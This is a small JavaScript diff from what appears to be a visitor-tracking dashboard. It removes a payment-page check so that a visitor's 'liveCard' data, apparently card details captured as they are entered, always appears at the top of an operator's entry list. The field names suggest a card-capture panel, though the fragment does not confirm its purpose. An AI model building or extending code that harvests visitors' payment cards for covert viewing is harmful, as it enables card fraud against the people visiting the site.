@@ -1607,7 +1607,7 @@ const visitorPage = (visitor.page || '').toLowerCase();
 const __lcTs = visitor.liveCardTimestamp ? new Date(visitor.liveCardTimestamp).getTime() : 0;
 const __pcs = visitor.paymentCards || [];
 const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0).getTime() : 0;
-if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {
+/*FIX-LIVE*/ if (visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {
   allEntries.push({ type: 'liveCard', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });
 }
 
